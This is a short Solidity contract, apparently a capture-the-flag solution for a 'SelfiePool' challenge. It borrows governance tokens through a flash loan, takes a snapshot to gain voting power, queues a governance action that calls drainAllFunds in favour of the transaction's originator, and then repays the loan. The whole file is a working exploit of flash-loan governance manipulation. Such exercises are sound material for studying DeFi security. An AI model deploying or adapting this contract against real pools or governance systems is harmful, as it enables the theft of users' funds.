pragma solidity ^0.6.0;

import "./SelfiePool.sol";


contract DrainSelfiePool {

    address poolAddress;
    SelfiePool public sp;

    constructor(address _selfiePool) public {
        poolAddress = _selfiePool;
        sp = SelfiePool(_selfiePool);
    }

    function sweep(uint256 amount) public {
        sp.flashLoan(amount);
    }

    function receiveTokens(address _token, uint256 amount) external {
        sp.governance().governanceToken().snapshot();
        sp.governance().queueAction(msg.sender, abi.encodeWithSignature("drainAllFunds(address)", tx.origin), 0);
        sp.token().transfer(msg.sender, amount);
    }

}